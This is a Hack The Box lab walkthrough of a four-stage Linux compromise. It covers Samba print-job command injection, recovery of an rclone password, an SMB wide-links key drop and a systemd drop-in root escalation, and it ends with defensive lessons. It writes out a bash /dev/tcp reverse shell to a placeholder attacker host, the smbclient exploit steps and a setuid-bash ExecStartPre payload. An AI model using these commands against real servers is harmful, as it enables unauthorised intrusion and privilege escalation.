# HTB: Abducted - Paraphrased Walkthrough

**Difficulty:** Medium · 

**OS:** Linux · 

**Attack chain:** Samba print command injection → rclone credential recovery → SMB wide-link abuse → systemd drop-in privilege escalation

<img width="572" height="231" alt="image" src="https://github.com/user-attachments/assets/8de228aa-3c5c-420e-abc6-3035aded5713" />

---

## 1. Overview

Abducted simulates a small professional-services file and print server built on Samba. The path to Domain Admin-well, to root-is a four-stage chain:

1. **Unauthenticated RCE** through a shell-injection flaw in Samba's printing subsystem (**CVE-2026-4480**), yielding a shell as `nobody`.
2. **Credential recovery** from an rclone backup configuration, revealing a working password for the user `scott`.
3. **Lateral movement** to `marcus` by abusing a writable SMB share configured with `wide links` and `force user`.
4. **Root** by writing a systemd drop-in for `smbd.service` and restarting the service through a permissive polkit rule.

---

## 2. Reconnaissance

A full TCP scan surfaces only three services-SSH, NetBIOS, and SMB-confirming a Linux file-server footprint.

| Port    | Service     | Notes                                       |
|---------|-------------|---------------------------------------------|
| 22/tcp  | SSH         | OpenSSH 9.6p1 on Ubuntu 24.04               |
| 139/tcp | netbios-ssn | Samba                                       |
| 445/tcp | SMB         | Samba, signing enabled but **not required** |

Two details stand out. First, the SMB signing setting means relay attacks are theoretically possible, though the walkthrough does not go that route. Second, nmap reports Samba 4.6.2-an obviously stale banner, because SMB2/3 does not leak version strings the way SMB1 did, and this box is running a current Ubuntu release.

NetBIOS enumeration with `nmblookup` confirms the workgroup is the default `WORKGROUP`-no Active Directory-and that the host is advertising the File Server Service, so SMB shares are worth enumerating.

---

## 3. SMB Enumeration

`netexec` shows guest authentication is enabled, but a bare null session cannot list shares. Supplying `-u guest -p ''` authenticates successfully yet still fails to enumerate-a useful reminder that "guest auth enabled" does not automatically mean "shares visible".

Going through `rpcclient` reveals a single printer named **`HP-Reception`**, described as a reception printer, and the server string "Hartley Group Document Services".

---

## 4. Foothold - CVE-2026-4480 (Samba `%J` injection)

### The bug

Samba's printing subsystem substitutes the client-supplied print-job name into the configured `print command` through the **`%J`** placeholder. It performs only a token sanitization step-replacing single quotes with underscores-leaving other shell metacharacters intact. Because the resulting string is handed to a shell, an attacker who controls the job name controls part of the command line. CVSS scores this **10.0** for remote code execution.

### The exploit

The trick is to name the file being printed after a shell metacharacter. Create a file literally called `|bash` whose contents are a reverse-shell payload:

```
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' > '|bash'
```

Then submit it as a print job to the `HP-Reception` share:

```
smbclient //TARGET/HP-Reception -N -c 'print "|bash"'
```

The `%J` substitution turns the print command into something like `cat | bash`, so the shell executes the file's contents. A listener on port 443 catches a shell as **`nobody`**.

> **Why `|bash` and not `|sh`?** The walkthrough switches from `sh` to `bash` specifically so the reverse-shell syntax with `/dev/tcp` works reliably.

---

## 5. Credential Recovery - rclone

As `nobody`, the filesystem root is unremarkable, but `/opt` contains a directory called **`offsite-backup`** holding two files: `sync.sh` and `rclone.conf`.

- `sync.sh` is a trivial cron-style script that mirrors `/srv/projects` to a remote called `offsite`.
- `rclone.conf` contains SFTP credentials for `svc-backup@backup.hartley-group.internal`, including an **obfuscated** password string.

rclone's password obfuscation is reversible by design-it is not encryption. Running:

```
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

returns the cleartext password **`iXzvcib3SrpZ`**.

### From nobody to scott

The recovered password does **not** work for `marcus`, but it **does** authenticate `scott`-both via `su` locally and over SSH. The user flag is in `scott`'s home directory.

---

## 6. Lateral Movement - SMB wide links to marcus

### Enumeration as scott

`scott` has no `sudo` rights and an essentially empty home directory. However, `scott` **owns** both directories under `/srv`-`projects` and `transfer`-and therefore owns the SMB shares backed by them.

The relevant share configuration in `/etc/samba/shares.conf` includes:

- **`wide links = yes`** - Samba will follow symlinks that point outside the share root.
- **`force user = marcus`** - all filesystem operations are performed with `marcus`'s UID, regardless of who authenticated.

On the filesystem, `scott` cannot `cd` into `/srv/transfer/marcus`, but over SMB he can **enter and write to** that directory because `force user` maps the operation to `marcus`.

### Dropping a key

Using `smbclient` as `scott`, the attack is:

```
smbclient //TARGET/transfer -U scott%iXzvcib3SrpZ
smb: \> mkdir marcus\.ssh
smb: \> put id_ed25519.pub marcus\.ssh\authorized_keys
```

Samba writes the public key into `/home/marcus/.ssh/authorized_keys` **as marcus**, because of `force user = marcus`. SSH then authenticates as `marcus` with the matching private key.

---

## 7. Root - systemd drop-in on smbd

### What marcus can do

`marcus` belongs to a group that has **write access to `/etc/systemd/system/smbd.service.d/`**, the drop-in directory for the Samba daemon. A polkit rule (`49-smbd-operators.rules`) additionally permits that group to **restart `smbd`** without full root.

### The exploit

Write a drop-in that runs before the service starts:

```
[Service]
ExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"
```

The leading `-` tells systemd to ignore a failure of this command, so a broken pre-start does not prevent `smbd` from launching. Then reload and restart:

```
systemctl daemon-reload
systemctl restart smbd
```

`ExecStartPre` runs as **root**, so `/tmp/0xdf` is created as a **SetUID/SetGID copy of bash**:

```
-rwsrwsrwx 1 root root 1446024 /tmp/0xdf
```

Running it with `-p` preserves the effective UID and yields a root shell. The root flag is in `/root/root.txt`.

---

## 8. Why the Chain Works - Key Takeaways

| Stage            | Misconfiguration / Vulnerability                                               | Lesson                                                                                                              |
|------------------|--------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------|
| Foothold         | `%J` passed to shell without escaping                                          | Print-job metadata is attacker-controlled input; treat it as code                                                   |
| Credential theft | rclone obfuscation mistaken for encryption                                     | Obfuscation is not protection; secrets on disk must be encrypted at rest                                            |
| Lateral movement | `wide links = yes` + `force user = marcus` on a share owned by a low-priv user | Combining symlink-following with privilege delegation turns a writable share into arbitrary file write as another user |
| Root             | Group-writable systemd drop-in + polkit restart permission                     | Write access to service unit directories is equivalent to root code execution                                       |

The box is a textbook example of **defense-in-depth failure**: each individual setting (`force user`, `wide links`, a polkit rule, a writable drop-in directory) looks defensible in isolation, but the composition hands over the entire host.
